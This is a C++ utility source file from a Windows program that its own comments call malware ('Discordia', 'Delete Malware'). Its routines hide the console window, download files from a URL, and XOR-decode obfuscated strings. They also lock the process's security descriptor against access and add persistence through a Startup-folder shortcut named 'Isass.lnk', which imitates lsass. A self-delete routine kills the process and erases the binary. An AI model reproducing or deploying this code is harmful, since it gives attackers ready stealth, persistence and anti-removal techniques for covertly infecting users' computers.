#include "stdafx.h"
#include "Utils.h"

/* Hiding Discordia Console to User */
void Utils::HideConsole()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

/* Check file exists */
bool Utils::FileExists(const char *fname)
{
	return access(fname, 0) != -1;
}

/* Download File */
void Utils::DownloadFile(wchar_t *url, wchar_t *dir)
{
	URLDownloadToFile(0, url, dir, 0, 0);
}

/* Create Dir */
void Utils::CreateDir(wchar_t *dir)
{
	CreateDirectory(dir, NULL);
}

/* CPU count getter */
int Utils::getCPU()
{
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);

	return sysinfo.dwNumberOfProcessors;
}

/* Encode Strings */
char* Utils::UnEnc(char *enc, char *key, DWORD encLen)
{
	char *unEnc = (char *)LocalAlloc(LPTR, encLen + 1);
	unEnc[encLen] = 0;
	for (DWORD i = 0; i < encLen; ++i)
		unEnc[i] = enc[i] ^ key[i % lstrlenA(key)];
	return unEnc;
}

// Win API ============================================================================

/* Deny Access to this process */
BOOL Utils::DenyAccessToId(DWORD pId)
{
	cout << "procID: " << pId;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");
	TEXT("(D;OICI;GA;;;BG)");
	TEXT("(D;OICI;GA;;;AN)");
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;

	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;

	return TRUE;
}

/* Check Process */
bool Utils::IsProcessRunning(const wchar_t *processName)
{
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry))
			if (!wcsicmp(entry.szExeFile, processName))
				exists = true;

	CloseHandle(snapshot);
	return exists;
}

DWORD Utils::FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processesSnapshot);
	return 0;
}

// get process name
string Utils::getProcessName(DWORD pId)
{
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, (LPWSTR)szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);

	std::wstring arr_w(szProcessName);
	std::string arr_s(arr_w.begin(), arr_w.end());

	return arr_s;
}

string Utils::getCurrentWorkDir()
{
	char current_work_dir[FILENAME_MAX];
	_getcwd(current_work_dir, sizeof(current_work_dir));

	return (string)current_work_dir;
}

// Command Prompt =====================================================================

/* Create Shortcut to Autoload in Current User */
void Utils::createAutoLoadShortcut(string fpath)
{
	system("echo Set oWS = WScript.CreateObject(\"WScript.Shell\") > CreateShortcut.vbs");
	system("echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Isass.lnk\" >> CreateShortcut.vbs");
	system("echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs");
	string _cmd = "echo oLink.TargetPath = \"" + fpath + "\" >> CreateShortcut.vbs";
	system(_cmd.c_str());
	system("echo oLink.Save >> CreateShortcut.vbs");
	system("cscript CreateShortcut.vbs");
	system("del CreateShortcut.vbs");
}

/* Delete Malware */
void Utils::Suicide()
{
	Utils utils;
	string command = "taskkill /im " + utils.getProcessName(GetCurrentProcessId())
		+ " /f & erase " + utils.getCurrentWorkDir()
		+ "\\" + utils.getProcessName(GetCurrentProcessId()) + " & exit";
	system(command.c_str());
}

// PowerShell =========================================================================
void CreateRestoreScript()
{

}